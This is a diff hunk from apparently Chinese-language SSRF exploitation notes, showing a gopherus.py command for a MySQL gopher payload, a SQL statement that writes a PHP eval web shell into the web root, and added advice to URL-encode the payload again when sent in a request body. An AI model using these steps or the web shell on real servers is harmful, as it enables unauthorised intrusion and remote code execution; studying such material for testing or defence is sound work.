@@ -138,6 +138,8 @@ BP中使用入口需进行双编码
 python2 gopherus.py --exploit mysql
 root
 select  "<?php eval($_POST(1);?>"  into outfile "/var/www/html/1.php";
+如果在请求体中
+记得把_后面那一大段内容再ur编码一次，发送
 ```
 ![](.topwrite/assets/image_1733842266820.png)
 使用gopherus.py对9000端口的FastCGI执行命令：
